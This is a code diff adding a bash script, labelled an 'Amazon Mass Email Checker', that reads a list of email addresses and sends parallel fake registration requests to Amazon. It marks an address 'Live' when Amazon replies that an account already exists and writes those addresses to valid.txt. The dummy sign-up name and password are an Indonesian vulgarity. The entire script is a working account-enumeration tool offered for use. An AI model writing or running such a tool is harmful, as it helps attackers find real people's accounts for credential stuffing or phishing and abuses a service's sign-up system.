@@ -1,0 +1,47 @@
+#!/bin/bash
+# Gausah Ganti Copyright Kalo Mau di hargai
+blue='\e[0;34'
+cyan='\e[0;36m'
+green='\e[0;34m'
+okegreen='\033[92m'
+lightgreen='\e[1;32m'
+white='\e[1;37m'
+red='\e[1;31m'
+yellow='\e[1;33m'
+
+email=$1
+THREADS=$2
+COUNTER=1
+
+checksite(){
+get=$(curl -s -b cookiesss.tmp --silent --compressed --connect-timeout 5 --cookie-jar cookiesss.tmp -X POST "https://www.amazon.com/ap/register%3Fopenid.assoc_handle%3Dsmallparts_amazon%26openid.identity%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%252Fidentifier_select%26openid.ns%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%26openid.claimed_id%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%252Fidentifier_select%26openid.return_to%3Dhttps%253A%252F%252Fwww.smallparts.com%252Fsignin%26marketPlaceId%3DA2YBZOQLHY23UT%26clientContext%3D187-1331220-8510307%26pageId%3Dauthportal_register%26openid.mode%3Dcheckid_setup%26siteState%3DfinalReturnToUrl%253Dhttps%25253A%25252F%25252Fwww.smallparts.com%25252Fcontactus%25252F187-1331220-8510307%25253FappAction%25253DContactUsLanding%252526pf_rd_m%25253DA2LPUKX2E7NPQV%252526appActionToken%25253DlptkeUQfbhoOU3v4ShyMQLid53Yj3D%252526ie%25253DUTF8%252Cregist%253Dtrue" -A 'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30' -d "customerName=kontol&email=$email&emailCheck=$email&password=Kontol1337&passwordCheck=Kontol1337")
+
+if [[ $get =~ "You indicated you are a new customer, but an account already exists with the e-mail" ]];
+then
+printf "${okegreen}[${COUNTER}] => [$email] => Live bos\n";
+echo "$email" >> valid.txt
+else
+printf "${red}[${COUNTER}] => $red$email => Die:(\n";
+echo "$email" >> die.txt
+fi
+}
+
+banner(){
+echo -e $yellow"====================================="
+echo -e $yellow"      Amazon Mass Email Checker      "
+echo -e $yellow"       Copyright Mrcakil@2020        "
+echo -e $yellow"====================================="
+}
+banner
+for email in $(cat $1); do
+              FAST=$(expr $COUNTER % $THREADS)
+              if [[ $FAST == 0 && $COUNTER > 0 ]];
+              then
+              sleep 1
+              fi
+     checksite $email &
+     COUNTER=$((COUNTER+1))
+done
+wait
+total=$(cat valid.txt | wc -l)
+printf "${cyan}Total : $total\n";
